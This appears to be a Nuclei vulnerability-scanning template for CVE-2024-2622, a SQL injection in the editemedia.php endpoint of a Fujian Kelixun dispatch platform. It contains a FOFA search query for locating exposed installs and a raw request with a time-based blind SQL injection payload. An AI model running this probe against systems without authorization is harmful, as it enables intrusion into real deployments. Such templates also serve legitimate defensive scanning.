id: CVE-2024-2622

info:
  name: 福建科立讯通信指挥调度平台editemedia.php sql注入漏洞
  author: fgz
  severity: high
  description: "在20240318之前的福建科立讯通信指挥调度平台中发现了一个漏洞。该漏洞被归类为关键级别，影响文件/api/client/editemedia.php的未知部分。通过操纵参数number/enterprise_uuid可导致SQL注入。攻击可能会远程发起。"
  tags: 2024,sqli
  metadata:
    max-request: 1
    fofa-query: body="app/structure/departments.php" || app="指挥调度管理平台"
    verified: true

requests:
  - raw:
      - |-
        GET /api/client/editemedia.php?enterprise_uuid=1%27%20AND%20(SELECT%203257%20FROM%20(SELECT(SLEEP(5)))JPVs)%20AND%20%27gDyM%27=%27gDyM HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: close
        Cookie: PHPSESSID=d62411cd4ada228583bbcae45f099567; authcode=cybk
        Upgrade-Insecure-Requests: 1

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && duration>=5 && duration<=6 && contains(body,'msg')"
